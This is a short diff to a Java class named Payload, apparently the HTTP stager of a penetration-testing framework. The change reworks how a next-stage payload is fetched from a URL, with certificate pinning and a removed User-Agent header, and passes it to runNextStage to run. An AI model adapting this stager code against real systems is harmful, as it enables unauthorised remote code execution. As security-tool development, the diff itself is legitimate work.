@@ -127,13 +127,12 @@ public class Payload {
 
     private static void runStageFromHTTP(String url) throws Exception {
         InputStream inStream;
+        URLConnection uc = new URL(url).openConnection();
+        uc.setRequestProperty("User-Agent", null);
         if (url.startsWith("https")) {
-            URLConnection uc = new URL(url).openConnection();
             PayloadTrustManager.useFor(uc, cert_hash);
-            inStream = uc.getInputStream();
-        } else {
-            inStream = new URL(url).openStream();
         }
+        inStream = uc.getInputStream();
         OutputStream out = new ByteArrayOutputStream();
         DataInputStream in = new DataInputStream(inStream);
         runNextStage(in, out, parameters);
